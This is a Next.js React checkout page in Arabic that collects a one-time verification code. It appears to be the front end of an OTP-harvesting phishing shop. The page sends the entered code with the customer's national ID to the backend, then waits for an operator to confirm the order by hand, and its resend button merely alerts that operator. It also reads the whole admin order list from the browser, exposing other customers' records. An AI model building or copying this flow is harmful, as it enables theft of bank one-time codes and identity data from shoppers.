"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound, FileText, Receipt, X } from "lucide-react";
import CheckoutStepper from "../../components/CheckoutStepper";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(60);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(cooldownRef.current!);
  }, []);

  function startCooldown() {
    clearInterval(cooldownRef.current!);
    setResendCooldown(60);
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
  const savedName = typeof window !== "undefined" ? localStorage.getItem("customerName") ?? "—" : "—";
  const customerName = customer?.name || savedName;

  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    const submittedCode = code;
    setSubmitCooldown(5);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
    });
    setCode("");
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──
  if (confirmed && dbOrderId) {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md overflow-hidden">
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition z-10">
            <X className="w-4 h-4" />
          </Link>
          <div className="flex flex-col items-center pt-5 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
            <span className="mt-2 bg-gradient-to-r from-teal-500 to-emerald-500 text-white text-sm font-bold px-5 py-1.5 rounded-full shadow-md">
              نجحت عملية الدفع
            </span>
          </div>
          <div className="px-5 py-4 flex flex-col gap-3 text-center">
            <div className="space-y-1">
              <p className="text-gray-800 font-bold text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-gray-500 text-sm">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex gap-3 pb-1">
              <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl bg-gradient-to-r from-teal-600 to-emerald-600 text-white font-semibold text-sm shadow-md">
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl bg-gradient-to-r from-teal-600 to-emerald-600 text-white font-semibold text-sm shadow-md">
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP Form ──
  return (
    <main className="min-h-screen bg-gradient-to-b from-gray-50 to-white flex flex-col items-center justify-center px-4 sm:px-6 py-10" dir="rtl">
      {/* Steps */}
      <div className="w-full max-w-lg">
        <CheckoutStepper active="confirm" />
      </div>

      <div className="bg-white rounded-3xl shadow-lg border border-gray-100 w-full max-w-lg overflow-hidden">
        {/* Icon header */}
        <div className="pt-7 pb-3 flex flex-col items-center gap-3">
          <div className="bg-gradient-to-br from-teal-500 to-emerald-600 rounded-2xl p-4 shadow-lg shadow-teal-200/50">
            <KeyRound className="text-white w-8 h-8 sm:w-10 sm:h-10" />
          </div>
          <h2 className="text-gray-800 text-base sm:text-lg font-extrabold">رمز التحقق OTP</h2>
        </div>

        <div className="p-5 sm:p-7 space-y-5">
          <div className="text-center space-y-1">
            <p className="text-gray-600 text-sm leading-relaxed">الرجاء إدخال رمز التحقق الذي يصلكم على الهاتف المحمول</p>
            <p className="text-gray-400 text-[11px]">قد يصل الرمز متأخراً (بعد دقائق)</p>
          </div>

          <div className="flex flex-col items-center gap-1.5">
            <input
              type="text"
              inputMode="numeric"
              value={code}
              maxLength={6}
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); }}
              className={`w-full text-center text-2xl sm:text-3xl font-bold tracking-[0.4em] border-2 rounded-2xl px-4 py-3.5 outline-none bg-gray-50 transition-all ${
                codeError ? "border-red-300 bg-red-50/50" : "border-gray-200 focus:border-teal-400 focus:bg-white focus:ring-2 focus:ring-teal-100"
              }`}
            />
            {codeError && <p className="text-red-500 text-[11px] font-bold">الكود يجب أن يكون 4 أو 6 أرقام</p>}
            {resent && <p className="text-emerald-600 text-xs font-bold">✅ تم إعادة إرسال الرمز</p>}
          </div>

          <div className="space-y-2.5 pt-1">
            <button
              onClick={handleSubmit}
              disabled={submitCooldown > 0}
              className="w-full bg-gradient-to-r from-teal-600 to-emerald-600 hover:from-teal-700 hover:to-emerald-700 active:scale-[0.98] text-white py-3.5 rounded-2xl font-bold text-sm transition-all shadow-lg shadow-teal-200/50 disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {submitCooldown > 0 ? `⏳ انتظر ${submitCooldown}ث` : "✅ إتمام الطلب"}
            </button>

            <button
              disabled={resendCooldown > 0}
              onClick={() => {
                fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                setResent(true);
                setTimeout(() => setResent(false), 3000);
                startCooldown();
              }}
              className="w-full flex items-center justify-center gap-2 py-3 rounded-2xl text-sm font-medium transition-all border disabled:opacity-50 disabled:cursor-not-allowed bg-teal-50 hover:bg-teal-100 text-teal-700 border-teal-200"
            >
              🔄 {resendCooldown > 0 ? `إعادة الإرسال بعد ${resendCooldown}ث` : "إعادة إرسال"}
            </button>

            <Link href="/checkout" className="w-full flex items-center justify-center gap-2 border border-gray-200 text-gray-600 hover:bg-gray-50 py-3 rounded-2xl font-medium text-sm transition">
              السابق →
            </Link>
          </div>
        </div>
      </div>
    </main>
  );
}
